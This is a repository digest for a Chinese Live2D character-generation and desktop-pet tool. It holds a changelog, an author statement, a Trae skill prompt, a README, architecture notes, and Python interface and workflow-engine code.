- ❌ 模糊错误提示
- ❌ 基础消息展示
- ❌ 静态评分显示
- ❌ 基础移动端支持

#### 改进后
- ✅ 分阶段详细进度
- ✅ 智能错误诊断和修复指导
- ✅ 长消息智能处理
- ✅ 动态可视化仪表盘
- ✅ 手势滑动导航

### 📊 性能指标

#### 加载性能
- ⚡ 初始加载: 减少 30%
- ⚡ 组件渲染: 提升 40%
- ⚡ 内存占用: 降低 25%

#### 交互响应
- ⚡ 按钮点击: 即时反馈
- ⚡ 手势识别: < 100ms
- ⚡ 状态更新: 无延迟

### 🔮 未来规划

#### v3.1 计划
- [ ] Web Worker 异步处理
- [ ] 虚拟滚动大列表
- [ ] PWA 离线支持
- [ ] 高级图表可视化

#### v3.2 计划
- [ ] 多语言支持
- [ ] 主题定制
- [ ] 快捷键支持
- [ ] 批量处理功能

### 🙏 致谢

感谢所有提出宝贵意见的用户，以及为项目做出贡献的开发者！

---

**发布日期**: 2026-05-20  
**版本号**: v3.0.0  
**维护者**: Live2D Community

```

## 作者声明
**文件**：`创作申明`
```
 我是一名在读的大一的学生。该作品的创作是有感而发所以就创作的 目前的作品状态处于持续更新中，但不会很快。希望大家也可以多提供建议我可以边学习边开发。觉得该作品有创意的可以多点点赞。

```

## Trae Skill 定义
**文件**：`.trae/skills/live2d-master-agent/SKILL.md`
```
---
name: live2d-master-agent
version: 7.2
creator: Live2D Community
description: 专业的 Live2D 制作助手 v7.2，提供从概念到绑定的完整工作流，支持多Provider图像生成、AI智能分层、桌面桌宠部署、Go API服务，具备安全加密存储、30项深度全覆盖测试验证等生产级功能
---

# Role

你是一名顶级 Live2D Technical Artist。

你精通：
- Live2D Cubism
- VTuber Rigging
- PSD 分层（52层官方标准）
- Anime Character Design
- Physics Setup
- Parameter Design
- Animation Workflow
- AI Image Generation（商汤SenseNova / Pollinations.ai / 多服务降级）
- 高清图像处理（768x768 / 1024x1024 / 2K / 4K）
- 安全加密存储（Fernet / PBKDF2）
- Go API 服务开发

# Goals

帮助用户：
1. 分析角色立绘
2. 规划 PSD 分层（52层官方标准）
3. 检查 Live2D 风险
4. 生成高质量角色立绘（智能自动选择最佳方案，支持免费和付费Provider）
5. 生成 Cubism 参数
6. 提供 Rigging 建议
7. 提供物理建议
8. 提供导出建议
9. 完成从概念到 Live2D 模型的完整制作流程
10. 直接生成可导入Live2D的PSD文件
11. 多样化角色生成（94种特征组合，避免撞衫）
12. 部署Live2D桌面桌宠（无需Live2D软件，一键运行）
13. 启动Go API服务（高性能、安全、可扩展）

# Features

## 多Provider图像生成

### 方案一：商汤SenseNova云端生成（推荐高质量）
- OpenAI兼容API，生成质量接近商业AI水平
- 结构化角色解析（自动提取发色/发型/眼睛/服装等）
- Live2D分层专用提示词（6大维度优化）
- 7维度智能质量评估
- 一键生成→自动分层无缝衔接

> **你可以用任意描述替换引号中的内容**，例如："银发巫女，紫色眼睛，和服，手持法杖"、"机甲少女，蓝白配色，未来风格"等

```bash
python local_image_generator.py --provider sensenova --live2d-rig "你的角色描述"
```

### 方案二：完全免费，无需API密钥
- Pollinations.ai 等免费服务，开箱即用
- 多服务自动降级机制
- 智能重试机制（3次重试）

> **支持任意文本描述**，系统会自动解析特征并生成对应形象

```bash
python master_tool.py "你的角色描述"
```

### 方案三：一键完整工作流
> 从文字描述直接生成可部署的Live2D桌宠，全程自动化

```bash
# 步骤1：生成角色立绘（将"你的角色描述"替换为任意你想要的形象）
python local_image_generator.py --full-workflow "你的角色描述"

# 步骤2：运行完整工作流（自动分层→质检→生成PSD）
python live2d_workflow.py --input character.png --output my_project

# 步骤3：部署桌面桌宠（使用分层结果一键运行）
python live2d_desktop_pet.py --layers ./output/my_project/layers/ --pet-name "你的桌宠名字"
```

## 专业分层

### 推荐：v6.0 K-means聚类分层（当前实现）
- 基于 K-means 颜色聚类算法，自动识别角色部件
- 支持自定义聚类数量（默认5层，可调整至15层+）
- 输出透明背景PNG图层 + 分层指南
- 适合大多数动漫角色，处理速度10-30秒

```bash
python live2d_layer_v6.py character.png --k 15
```

### 其他内置分层工具
- v5.0 分层工具（简单颜色检测）- `live2d_layer_pro.py`
- B站优化版分层 - `live2d_layer_bilibili.py`
- 完整工作流 - `live2d_workflow.py`（生成→评估→优化→分层→PSD）

> **注意**：See-through AI分层（LayerDiff 3D + Marigold Depth）为规划功能，当前版本以 K-means 聚类为主。可通过 `github_layer_integration.py` 集成外部 See-through 工具。

## Live2D桌面桌宠

无需Live2D软件，一键部署到桌面：
- 身体摆动、眨眼、呼吸动画
- 表情切换（正常/开心/害羞/惊讶/困倦）
- 点击互动、拖拽移动
- 鼠标视线跟随
- 60帧预渲染动画

```bash
python live2d_desktop_pet.py --layers ./output/layers/ --pet-name "我的桌宠"
```

## Go API服务（v7.1性能优化）

```bash
cd api
go mod tidy
go run main.go
```

- Gzip 压缩响应
- 请求缓存（TTL + 大小限制）
- 连接池优化
- 并发处理（CPU核心数×2）
- 输入验证中间件
- 速率限制（每IP每分钟60请求）
- Python脚本沙箱执行（超时控制/环境变量过滤）
- 输出脱敏（防止API密钥泄露）

## 安全增强（v7.1）

- API密钥通过SecureConfig安全存储（不写入os.environ）
- Fernet加密存储（AES-128-CBC + HMAC-SHA256）
- 路径遍历防护
- 命令注入过滤
- 模型白名单验证
- 提示词清理
- CORS安全配置
- 安全响应头

## 效率提升

- **角色生成**：2-3小时 → 30秒（提升240倍+）
- **PSD分层**：1-2小时 → See-through 10秒（提升360倍+）
- **总流程**：4-5小时 → 3分钟（提升100倍+）

# Workflow Modes

## 向导模式（默认）
逐步引导用户完成9步完整流程，适合新手用户。

## 专家模式
自由选择任务清单，适合有经验的用户。

# Commands

## 核心命令

| 命令 | 功能 |
|------|------|
| "我想做一个 Live2D 模型" | 开始新的向导流程 |
| "下一步" / "继续" | 进入下一个步骤 |
| "跳过此步" | 跳过当前步骤 |
| "上一步" / "返回" | 回到上一个步骤 |
| "我想先做步骤 X" | 跳转到指定步骤（X 为 1-9） |
| "切换到专家模式" | 切换到专家模式 |
| "回到向导模式" | 切换回向导模式 |
| "保存进度" | 保存当前状态 |
| "查看进度" | 显示当前进度 |

## 快速命令

> **以下所有命令中的描述文本均可替换为你想要的任意角色形象**

```bash
# 一键生成角色（免费）- 将"你的角色描述"替换为任意形象
python master_tool.py "你的角色描述"

# 生成多个多样化角色（每次不同特征组合）
python master_tool.py -n 5 "你的角色描述"

# Live2D分层专用生成（高质量，适合后续绑定）
python local_image_generator.py --provider sensenova --live2d-rig "你的角色描述"

# 一键生成+自动分层（生成后直接输出分层PSD）
python local_image_generator.py --provider sensenova --live2d-rig --auto-layer "你的角色描述"

# 完整工作流（从图片到分层到质检）
python live2d_workflow.py --input character.png --output my_project

# 桌面桌宠部署（将分层结果变成可动桌宠）
python live2d_desktop_pet.py --layers ./output/my_project/layers/ --pet-name "你的桌宠名字"

# 启动Go API服务
cd api && go mod tidy && go run main.go

# 运行全覆盖测试
python test_deep_coverage.py
```

# Workflow Steps

> **完整工作流：从文字描述 → 角色形象 → 分层PSD → 桌面桌宠，全程自动化**

## 步骤 1: 概念设定
- **目标:** 确定角色的基本设定
- **输入:** 你用自然语言描述想要的角色（如："银发巫女，紫色眼睛，和服"）
- **输出:** 角色设定文档 `concept.md`
- **AI 辅助:** 提供创意建议和设计灵感

## 步骤 2: 立绘生成
- **目标:** 根据你的描述生成适合 Live2D 的角色立绘
- **输入:** 步骤 1 的设定或你直接提供的描述
- **输出:** 高质量角色立绘图片 `character.png`（支持 2K/4K）
- **AI 辅助:** 多Provider自动选择，结构化角色解析（自动提取发色/发型/眼睛/服装等特征）
- **命令示例:** `python master_tool.py "你的角色描述"`

## 步骤 3: PSD 分层规划
- **目标:** 根据立绘规划 PSD 图层结构
- **输入:** 步骤 2 生成的角色立绘图片
- **输出:** 完整的分层方案文档 `psd-plan.md`（52层官方标准、Draw Order、命名规范）
- **AI 辅助:** 智能识别可动部件和遮挡关系

## 步骤 4: 图片转 PSD
- **目标:** 将普通图片转换为基本的分层 PSD
- **输入:** 步骤 2 的角色立绘 + 步骤 3 的分层方案
- **输出:** 初始 PSD 文件 `character.psd`
- **AI 辅助:** K-means聚类 / See-through AI分层

## 步骤 5: PSD 质检
- **目标:** 检查 PSD 是否符合 Live2D 规范
- **输入:** 步骤 4 生成的 PSD 文件
- **输出:** 质检报告 `qa-report.md`（问题清单 + 修改建议）
- **实时反馈:** 进度指示、错误诊断、修复指导

## 步骤 6: Cubism 参数设计
- **目标:** 设计 Cubism 工程的参数配置
- **输入:** 质检通过的 PSD
- **输出:** Cubism 参数配置文档 `cubism-params.md`（6个预设模板）
- **AI 辅助:** 基于角色特征的参数推荐

## 步骤 7: 物理设置
- **目标:** 为动态部件提供物理参数
- **输入:** 角色特征（头发长度、是否有耳朵/尾巴等）
- **输出:** 物理参数配置 `physics-config.json`（重力、风力、回复力、阻尼等）
- **AI 辅助:** 智能物理模拟建议

## 步骤 8: Rigging 指导
- **目标:** 提供完整的绑定操作指南
- **输入:** 所有前面的输出
- **输出:** 详细的 Rigging 操作指南 `rigging-guide.md` + 最佳实践
- **AI 辅助:** 步骤指导和技巧提示

## 步骤 9: 桌面桌宠部署（新增）
- **目标:** 无需Live2D软件，一键部署桌宠到桌面
- **输入:** 步骤 4 分层后的PNG图层
- **输出:** 可运行的桌面桌宠包 `pet_package/`（60帧动画 + 配置文件 + 运行脚本）
- **功能:** 身体摆动、眨眼、呼吸、表情切换、点击互动
- **命令示例:** `python live2d_desktop_pet.py --layers ./output/my_project/layers/ --pet-name "你的桌宠名字"`

# Usage Modes

## 1. 终端 Agent 模式

直接在仓库根目录启动交互式命令行 Agent：

```bash
python live2d_agent.py
```

支持菜单选择和自然语言命令，例如：
- `1` 生成角色
- `2` 图片分层
- `3` 部署桌宠
- `4` 一键完整工作流
- `exit` 退出

## 2. Trae Skill 模式

本目录为 Trae IDE Skill 的标准入口，配置方式：

1. 克隆仓库：`git clone https://github.com/mw2wbyys6t-sudo/Live2D.git`
2. 在 Trae 中加载 `.trae/skills/live2d-master-agent/` 作为 Skill
3. 通过 Trae 的 Agent 面板调用

---

# Rules

## 必须遵循
- 使用专业 Live2D 术语
- 输出结构化结果
- 优先考虑 Cubism 兼容性
- 自动发现遮挡问题
- 自动分析动态结构
- 自动判断是否适合绑定
- 维护会话状态，记住用户的进度和选择
- 在步骤之间提供清晰的导航选项
- 提供实时的处理进度反馈
- 针对错误提供明确的修复建议
- API密钥必须安全存储，不泄露到环境变量
- 所有代码修改必须通过全覆盖测试验证

## 禁止行为
- 模糊描述
- 随机命名
- 不规范参数名
- 忽略遮挡关系
- 跳过必要的质量检查步骤
- 不提供错误处理指导
- 泄露API密钥
- 提交未测试的代码

# Quality Standards

## PSD 文件要求

### 格式规范
- ✅ 文件格式: PSD (Photoshop)
- ✅ 颜色模式: RGB
- ✅ 颜色通道: 8bit/channel
- ✅ 颜色配置文件: sRGB
- ✅ 推荐尺寸: 1024×1024 或 2048×2048
- ✅ 最大文件大小: 50MB
- ✅ 混合模式: 仅支持 Normal
- ✅ 图层数量: 25-30层（含头发/眼睛/嘴巴等子部件细分），可扩展至52层标准

### 图层规范
- ✅ 部件独立分层
- ✅ 规范的英文命名
- ✅ 完整的图层结构
- ✅ 适当的透明度设置
- ✅ 无同名图层

## 图像质量标准

### 高质量要求
- ✅ 分辨率: 2048×2048 (2K) 或更高
- ✅ 清晰度: 锐利边缘，无模糊
- ✅ 色彩: 鲜艳准确，无色偏
- ✅ 分层准备: 清晰可分离

## 测试标准

### 全覆盖测试
- ✅ 30项深度功能测试（安全/核心接口/图像生成/工作流/桌宠/性能）
- ✅ 独立虚拟环境验证

...（省略后续 132 行，原文件共 482 行）...

```

## Skill README（节选）
**文件**：`.trae/skills/live2d-master-agent/README.md`
```
# 🎨 Live2D Master Agent

> **专业的AI辅助Live2D制作助手 - 从概念到绑定的完整工作流**

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Python 3.8+](https://img.shields.io/badge/Python-3.8+-blue.svg)](https://www.python.org/)
[![Stars](https://img.shields.io/github/stars/mw2wbyys6t-sudo/Live2D)](https://github.com/mw2wbyys6t-sudo/Live2D/stargazers)
[![Version](https://img.shields.io/badge/version-v7.2-green.svg)]()
[![Last Update](https://img.shields.io/badge/last%20update-2026--06--17-orange.svg)]()

---

## ✨ 一句话介绍

**3分钟创建专业Live2D角色！** 无需付费，一键生成，立即使用。

集成 [See-through](https://github.com/shitagaki-lab/see-through) (SIGGRAPH 2026) 专业级AI分层工具，提供从图像生成到PSD分层的完整工作流。

**🔥 v7.2 新增：桌面桌宠功能！** 无需Live2D软件，一键将角色部署为桌面宠物，支持动画、表情和交互！

---

## 📦 安装方式

### 方式一：作为 Trae IDE Skill 使用（推荐）

将本仓库克隆到 Trae IDE 的 skills 目录：

```bash
# Windows (PowerShell)
$skillDir = "$env:USERPROFILE\.trae\skills\live2d-master-agent"
New-Item -ItemType Directory -Force -Path $skillDir
git clone https://github.com/mw2wbyys6t-sudo/Live2D.git $skillDir

# Mac/Linux
mkdir -p ~/.trae/skills/live2d-master-agent
git clone https://github.com/mw2wbyys6t-sudo/Live2D.git ~/.trae/skills/live2d-master-agent
```

然后在 Trae IDE 中调用 `live2d-master-agent` skill 即可。

### 方式二：作为独立 Agent 使用（CMD/PowerShell/Terminal）

**适用于：Windows CMD、PowerShell、Mac/Linux Terminal**

> 由于终端环境通常不支持中文输入，Agent 已全面适配英文界面，同时保留中文识别能力。

```bash
# 1. 克隆仓库
git clone https://github.com/mw2wbyys6t-sudo/Live2D.git
cd Live2D

# 2. 安装依赖
python -m pip install -r requirements.txt
```

> **Windows用户注意**：如果 `pip install` 报错，请使用 `python -m pip install -r requirements.txt`

---

## 🚀 快速开始

### 启动 Agent

```bash
python live2d_agent.py
```

### 终端使用说明

**终端兼容性提示**：
- CMD / PowerShell / Terminal 等终端环境**不支持中文输入**
- Agent 已全面适配英文界面，所有菜单和提示均为英文
- 你可以使用英文命令或数字菜单进行操作
- 支持中文关键词作为备用识别（如果你在支持中文的环境中）

### 交互方式

Agent 支持多种交互方式，适配不同使用场景：

**方式1：数字菜单（推荐终端/CMD/PowerShell使用）**
```
============================================================

     Live2D Master Agent v7.1
     Your Live2D Assistant - Tell me what you want

============================================================

[1] Generate Character  - Generate a character from description
[2] Layer Separation    - Split image into Live2D layers
[3] Desktop Pet         - Deploy as animated desktop pet
[4] Full Workflow       - Generate + Layer + Pet in one go
[5] Settings            - API keys, output directory
[6] Help                - Usage guide
[0] Exit                - Quit

Tip: You can also type English commands directly:
     "generate a cat girl" / "layer my image" / "deploy pet"

Enter your choice (0-6 or command): 1
Describe your character (e.g., silver hair witch, purple eyes, kimono): cute anime girl, pink hair
```

**方式2：英文自然语言命令（支持中文识别）**
```
Enter your choice (0-6 or command): generate a cat girl with pink hair
Enter your choice (0-6 or command): layer my image
Enter your choice (0-6 or command): deploy pet
Enter your choice (0-6 or command): full workflow
```

> **注意**：Agent 界面为英文以确保终端兼容性，但支持识别中文关键词。如果你在支持中文输入的环境（如 Trae IDE 内置终端），也可以输入中文描述。

**方式3：快速模式（无需交互，适合脚本调用）**
```bash
# Generate character
python live2d_agent.py --quick "cute anime girl, pink hair"

# Full workflow
python live2d_agent.py --workflow "cat girl, pink hair, green eyes"

# Layer image
python live2d_agent.py --layer "./my_character.png"

# Deploy pet
python live2d_agent.py --pet "./layers_output"
```

---

## 🛠️ 命令行模式（高级用户）

如果你更喜欢直接命令行操作：

### 生成角色

```bash
python master_tool.py "cute anime girl, pink hair"
```

### 图片分层

```bash
python live2d_workflow.py --input your_image.png --output my_project
```

### 部署桌宠

```bash
python live2d_desktop_pet.py --layers-dir my_project/layers_xxx --output my_pet
```

### 完整工作流

```bash
python live2d_agent.py --workflow "cat girl, pink hair, green eyes"
```

系统会自动：
- ✅ 生成高质量角色立绘
- ✅ 使用 See-through 进行专业级分层
- ✅ 提供完整的工作流程

**就是这么快！** ⚡

### 第五步：交互式终端 Agent 模式（v7.2新功能）

```bash
# 启动交互式命令行 Agent
python live2d_agent.py
```

进入菜单后可选择功能，或直接输入自然语言描述：
- `1` → 生成角色
- `2` → 图片分层
- `3` → 部署桌宠
- `4` → 一键完整工作流
- `exit` → 退出

### 第六步：桌面桌宠（v7.2新功能）

```bash
# 从分层结果创建桌面宠物
python live2d_desktop_pet.py --layers ./output/layers/ --pet-name "MyPet"

# 桌宠功能:
# - 身体摆动、眨眼、呼吸动画
# - 表情切换（正常/开心/害羞/惊讶/困倦）
# - 点击互动、拖拽移动
# - 鼠标视线跟随
```

**桌宠功能：**
- ✅ 动画身体摆动
- ✅ 表情切换（微笑、眨眼、害羞等）
- ✅ 鼠标交互（点击、拖拽）
- ✅ 自动移动

---

...（省略后续 321 行，原文件共 521 行）...

```

## 架构说明（节选）
**文件**：`.trae/skills/live2d-master-agent/ARCHITECTURE.md`
```
# Live2D Master Agent - 架构设计

## 系统架构图

```
┌─────────────────────────────────────────────────────┐
│                   用户/客户端                         │
└──────────────────────┬──────────────────────────────┘
                       │ HTTP
┌──────────────────────▼──────────────────────────────┐
│              Go API Server (Gin)                     │
│  ┌───────────────────────────────────────────────┐  │
│  │              安全中间件层                       │  │
│  │  ┌──────────┐ ┌──────────┐ ┌──────────────┐  │  │
│  │  │输入验证   │ │速率限制   │ │安全响应头     │  │  │
│  │  └──────────┘ └──────────┘ └──────────────┘  │  │
│  └───────────────────────────────────────────────┘  │
│  ┌───────────────────────────────────────────────┐  │
│  │              路由层 (Handlers)                  │  │
│  │  /api/generate  /api/psd-plan  /api/status    │  │
│  └───────────────────────────────────────────────┘  │
│  ┌───────────────────────────────────────────────┐  │
│  │              服务层 (Services)                  │  │
│  │  ┌──────────────┐  ┌──────────────────────┐  │  │
│  │  │ImageGenerator│  │  PythonBridge(沙箱)   │  │  │
│  │  └──────────────┘  └──────────────────────┘  │  │
│  │  ┌──────────────┐  ┌──────────────────────┐  │  │
│  │  │ RequestCache │  │  Config(安全配置)      │  │  │
│  │  └──────────────┘  └──────────────────────┘  │  │
│  └───────────────────────────────────────────────┘  │
└──────────────────────┬──────────────────────────────┘
                       │ exec (沙箱隔离)
┌──────────────────────▼──────────────────────────────┐
│              Python 脚本层                            │
│  ┌──────────────┐  ┌──────────────┐                 │
│  │master_tool.py│  │local_gen.py  │                 │
│  └──────────────┘  └──────────────┘                 │
│  ┌──────────────┐  ┌──────────────┐                 │
│  │layer_pro.py  │  │live2d_pet.py │                 │
│  └──────────────┘  └──────────────┘                 │
└──────────────────────┬──────────────────────────────┘
                       │ API调用
┌──────────────────────▼──────────────────────────────┐
│              外部API服务                              │
│  ┌──────────────┐  ┌──────────────────────┐         │
│  │商汤SenseNova │  │火山引擎ARK/Seedream   │         │
│  └──────────────┘  └──────────────────────┘         │
└─────────────────────────────────────────────────────┘
```

## 数据流

```
用户请求 → Go中间件(验证/限流) → Handler → Service
    → PythonBridge(沙箱执行) → Python脚本 → 外部API
    → 结果返回(输出脱敏) → Handler → JSON响应
```

## 模块依赖

```
config.py (SecureConfig)
    ├── secure_storage.py (Fernet加密)
    │       └── .env.encrypted (加密文件)
    └── .env (明文配置，仅本地)

core/
    ├── interfaces.py (抽象接口)
    │       ├── ImageGenerator
    │       ├── LayerSeparator
    │       ├── PSDExporter
    │       ├── QualityAssessor
    │       └── WorkflowStep
    └── workflow_engine.py (工作流引擎)
            └── 依赖 interfaces.WorkflowStep

api/
    ├── main.go (入口+中间件)
    ├── handlers/ (HTTP处理器)
    ├── services/ (业务逻辑)
    └── config/ (Go配置)
```

## 安全架构

### 密钥保护层级

1. **传输层**: HTTPS加密传输
2. **存储层**: Fernet加密文件 + 私有字典
3. **内存层**: 不写入os.environ + 退出清理
4. **输出层**: 脱敏正则 + repr隐藏

### 沙箱隔离

```
Go进程 → exec.CommandContext(超时) → Python子进程
    ├── 环境变量过滤（不传递API密钥）
    ├── 资源限制（Setpgid进程组）
    ├── 超时终止（SIGKILL进程组）
    └── 输出脱敏（sanitizeOutput）
```

## 扩展指南

### 添加新的图像生成器

1. 继承 `core.interfaces.ImageGenerator`
2. 实现 `generate()`, `is_available()`, `get_name()`
3. 在 `config.py` 中添加对应配置
4. 在 Go 的 `services/image_generator.go` 中注册

### 添加新的工作流步骤

1. 继承 `core.interfaces.WorkflowStep`
2. 实现 `execute()`, `get_name()`, `can_retry()`
3. 使用 `WorkflowEngine.add_step()` 编排步骤
4. 调用 `engine.execute()` 运行工作流

```

## 版本信息
**文件**：`.trae/skills/live2d-master-agent/VERSION_INFO.json`
```
{
    "version": "7.1",
    "release_date": "2026-05-30",
    "features": [
        "桌面桌宠功能 - 无需Live2D软件，一键部署",
        "动画系统 - 身体摆动、眨眼、呼吸动画",
        "表情系统 - 支持正常、开心、害羞、惊讶、困倦等表情",
        "交互响应 - 点击互动、拖拽移动、悬停跟随",
        "See-through AI分层集成（SIGGRAPH 2026）",
        "多服务自动降级机制",
        "智能重试机制提升生成成功率",
        "支持自定义图片分辨率",
        "优化的提示词更适合Live2D制作",
        "支持Flux模型"
    ],
    "system_requirements": {
        "python_version": "3.8+",
        "desktop_pet": {
            "required_packages": ["pygame", "pillow", "numpy"],
            "os_support": ["Windows", "Mac", "Linux"]
        }
    },
    "workflow_steps": [
        "1. 智能生成 - AI生成+官方标准提示词",
        "2. 质量评估 - 官方标准检查(加权评分)",
        "3. 图像优化 - 背景去除/边缘增强/尺寸调整",
        "4. 智能分层 - K-means/官方部件命名(49层)",
        "5. PSD生成 - 官方兼容格式+完整指南",
        "6. 桌面部署（可选）- 一键创建桌面桌宠"
    ]
}
```

## 核心接口定义
**文件**：`.trae/skills/live2d-master-agent/core/interfaces.py`
```
#!/usr/bin/env python3
"""
Live2D Master Agent - 核心接口定义

定义工作流中各步骤的抽象接口，遵循依赖倒置原则。
所有具体实现必须继承这些抽象类并实现其方法。
"""

from abc import ABC, abstractmethod
from typing import Dict, List, Optional


class ImageGenerator(ABC):
    """图像生成器接口"""

    @abstractmethod
    def generate(self, prompt: str, **kwargs) -> str:
        """生成图像，返回图像文件路径"""
        pass

    @abstractmethod
    def is_available(self) -> bool:
        """检查生成器是否可用"""
        pass

    @abstractmethod
    def get_name(self) -> str:
        """获取生成器名称"""
        pass


class LayerSeparator(ABC):
    """图层分离器接口"""

    @abstractmethod
    def separate(self, image_path: str, output_dir: str) -> List[str]:
        """分离图层，返回图层文件路径列表"""
        pass


class PSDExporter(ABC):
    """PSD导出器接口"""

    @abstractmethod
    def export(self, layers: List[str], output_path: str) -> bool:
        """导出PSD文件，返回是否成功"""
        pass


class QualityAssessor(ABC):
    """质量评估器接口"""

    @abstractmethod
    def assess(self, image_path: str) -> Dict[str, float]:
        """评估图像质量，返回各项质量指标"""
        pass


class WorkflowStep(ABC):
    """工作流步骤接口"""

    @abstractmethod
    def execute(self, context: Dict) -> Dict:
        """执行步骤，接收并返回上下文字典"""
        pass

    @abstractmethod
    def get_name(self) -> str:
        """获取步骤名称"""
        pass

    @abstractmethod
    def can_retry(self) -> bool:
        """步骤是否可重试"""
        pass

```

## 工作流引擎（节选）
**文件**：`.trae/skills/live2d-master-agent/core/workflow_engine.py`
```
#!/usr/bin/env python3
"""
Live2D Master Agent - 工作流引擎

编排工作流步骤，支持链式调用、自动重试和错误处理。
"""

import time
import logging
from typing import Dict, List, Optional

from core.interfaces import WorkflowStep

logger = logging.getLogger(__name__)


class WorkflowContext:
    """
    工作流上下文 - 传递步骤间的数据和状态

    提供字典式的数据存取，同时记录步骤执行历史。
    """

    def __init__(self, initial_data: Optional[Dict] = None):
        self._data = initial_data or {}
        self._history: List[Dict] = []

    def get(self, key: str, default=None):
        """获取上下文中的值"""
        return self._data.get(key, default)

    def set(self, key: str, value):
        """设置上下文中的值"""
        self._data[key] = value

    def update(self, data: Dict):
        """批量更新上下文"""
        self._data.update(data)

    def to_dict(self) -> Dict:
        """导出为字典"""
        return self._data.copy()

    def log_step(self, step_name: str, success: bool, message: str = ""):
        """记录步骤执行历史"""
        self._history.append({
            "step": step_name,
            "success": success,
            "message": message,
            "timestamp": time.time(),
        })

    def get_history(self) -> List[Dict]:
        """获取执行历史"""
        return self._history.copy()

    def __getitem__(self, key: str):
        return self._data[key]

    def __setitem__(self, key: str, value):
        self._data[key] = value

    def __contains__(self, key: str) -> bool:
        return key in self._data


class WorkflowEngine:
    """
    工作流引擎 - 编排和执行工作流步骤

    特性:
    - 链式添加步骤
    - 自动重试（指数退避）
    - 错误处理和上下文传递
    - 执行日志记录
    """

    def __init__(self, name: str = "default"):
        self.name = name
        self._steps: List[WorkflowStep] = []
        self.steps: List[Dict] = []  # 兼容外部访问
        self._max_retries: int = 3
        self._retry_delay: float = 1.0  # 初始重试延迟（秒）
        self._execution_log: List[Dict] = []

    def add_step(self, step, name: Optional[str] = None) -> 'WorkflowEngine':
        """添加步骤（支持链式调用，兼容函数和WorkflowStep对象）"""
        if isinstance(step, WorkflowStep):
            self._steps.append(step)
        else:
            # 兼容普通函数
            self._steps.append(step)
            if name:
                self.steps.append({'func': step, 'name': name})
            else:
                self.steps.append({'func': step, 'name': getattr(step, '__name__', 'unknown')})
        return self

    def set_max_retries(self, max_retries: int) -> 'WorkflowEngine':
        """设置最大重试次数"""
        self._max_retries = max_retries
        return self

    def execute(self, context: Optional[Dict] = None) -> Dict:
        """
        执行工作流

        Args:
            context: 初始上下文

        Returns:
            最终上下文
        """
        context = context or {}
        context['_engine'] = self.name
        context['_start_time'] = time.time()

        for step in self._steps:
            # 兼容 WorkflowStep 对象和普通函数
            if isinstance(step, WorkflowStep):
                step_name = step.get_name()
                can_retry = step.can_retry()
                run = step.execute
            else:
                step_name = getattr(step, '__name__', 'anonymous')
                can_retry = False
                run = step

            step_start = time.time()
            retries = 0
            success = False

            while retries <= (self._max_retries if can_retry else 0):
                try:
                    result = run(context)
                    if isinstance(result, dict):
                        context = result
                    success = True
                    break
                except Exception as e:
                    retries += 1
                    if retries <= self._max_retries and can_retry:
                        delay = self._retry_delay * (2 ** (retries - 1))
                        logger.warning(
                            f"步骤 '{step_name}' 执行失败 "
                            f"(第{retries}次重试，{delay:.1f}秒后重试): {e}"
                        )
                        time.sleep(delay)
                    else:
                        logger.error(f"步骤 '{step_name}' 执行失败: {e}")
                        context['_error'] = str(e)
                        context['_failed_step'] = step_name
                        break

            step_duration = time.time() - step_start
            self._execution_log.append({
                'step': step_name,
                'success': success,
                'retries': retries,
                'duration': round(step_duration, 3),
            })

            if not success:
                break

        context['_end_time'] = time.time()
        context['_duration'] = round(context['_end_time'] - context['_start_time'], 3)
        context['_execution_log'] = self._execution_log

        return context

    def get_execution_log(self) -> List[Dict]:
        """获取执行日志"""
        return self._execution_log.copy()

    def reset(self) -> 'WorkflowEngine':
        """重置引擎状态"""
        self._steps.clear()
        self._execution_log.clear()
        return self

```

## 一站式工具箱（节选）
**文件**：`.trae/skills/live2d-master-agent/master_tool.py`
```
#!/usr/bin/env python3
"""
Live2D Master Agent v7.2 - 全面升级版
功能: 本地图片生成 + AI智能分层 + PSD转换

核心：
- 🎯 自研本地 Stable Diffusion 生成器 v5.0（多阶段/批量/智能）
- 🟢 内置AI分层工具（基于色彩聚类 + 区域检测）
- 🔗 生成与分层无缝连接（一键工作流）

特点:
- 完全本地运行，无需网络
- 支持 CPU/GPU 推理
- GPT-4 风格提示词工程
- 智能质量评估 + 自动重试
- 批量生成选最优
- 参考图风格自动分析
- 生成即分层就绪
"""

import os
import sys
import time
import random
import re
import json
from pathlib import Path
import argparse
from typing import Optional, Dict, Tuple, List, Any

# 多样化特征库 - 避免撞衫
FEATURES = {
    'hairstyle': [
        'long hair', 'short hair', 'medium hair', 'ponytail', 'twintails',
        'bun', 'drill hair', 'bob cut', 'pixie cut', 'side ponytail',
        'half up', 'messy hair', 'straight hair', 'wavy hair', 'curly hair'
    ],
    'hair_color': [
        'pink hair', 'purple hair', 'blue hair', 'green hair', 'red hair',
        'orange hair', 'blonde hair', 'silver hair', 'white hair', 'black hair',
        'brown hair', 'grey hair', 'gradient hair', 'pastel pink', 'neon green'
    ],
    'eye_color': [
        'blue eyes', 'green eyes', 'brown eyes', 'purple eyes', 'red eyes',
        'golden eyes', 'silver eyes', 'pink eyes', 'amber eyes', 'cyan eyes'
    ],
    'clothing': [
        'school uniform', 'serafuku', 'sailor uniform', 'casual clothes',
        'dress', 'skirt', 'kimono', 'maid outfit', 'punk style', 'gothic',
        'lolita fashion', 'business suit', 'sportswear', 'winter coat'
    ],
    'accessories': [
        'hair ribbon', 'hair bow', 'headband', 'glasses', 'eyepatch', 'hat',
        'earrings', 'necklace', 'bracelet', 'choker', 'scarf', 'gloves'
    ],
    'expression': [
        'smile', 'happy', 'cute', 'gentle', 'shy', 'blushing', 'serious',
        'cool', 'confident', 'playful', 'cheerful', 'sleepy', 'surprised'
    ],
    'pose': [
        'standing', 'sitting', 'waving', 'peace sign', 'hands on hips',
        'arms crossed', 'looking at viewer', 'three quarter view', 'cute pose'
    ]
}

# Live2D 优化的发型 - 避免过于复杂的卷发
LIVE2D_HAIRSTYLES = [
    'straight hair', 'long straight hair', 'short straight hair',
    'medium hair', 'ponytail', 'twintails', 'side ponytail',
    'bob cut', 'hime cut', 'bangs', 'blunt bangs'
]

# Live2D 优化的姿势 - 确保完整身体可见
LIVE2D_POSES = [
    'standing', 'full body', 'looking at viewer',
    'arms at sides', 'straight-on view'
]

# 专业级提示词模板（匹配参考图质量）
PROFESSIONAL_PROMPT_TEMPLATE = """(masterpiece:1.4), (best quality:1.3), (ultra detailed:1.2), (highres:1.2), (8k uhd:1.1),
(anime style:1.3), (illustration:1.2), (official art:1.2), (pixiv:1.1), (artstation:1.1),
